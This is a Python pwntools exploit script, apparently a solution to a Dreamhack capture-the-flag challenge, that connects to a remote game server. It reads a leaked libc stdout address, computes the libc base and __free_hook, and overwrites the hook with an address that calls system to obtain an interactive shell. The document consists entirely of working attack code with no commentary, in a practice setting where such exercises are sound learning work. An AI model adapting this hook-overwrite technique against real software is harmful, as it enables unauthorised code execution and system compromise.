from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 11455)
libc = ELF('./libc-2.23.so')
main_system = 0x0000000000400a11 

p.recvuntil(b"stdout: ")

stdout = int(p.recvline()[2:-1], 16)
lb = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = lb + libc.symbols['__free_hook']
slog('stdout', stdout)
slog('lb', lb)
slog('free_hook', free_hook)

payload = p64(free_hook) + p64(main_system) 
p.sendlineafter(b"Size: ", b"16")
p.sendafter(b"Data: ", payload)

p.interactive()
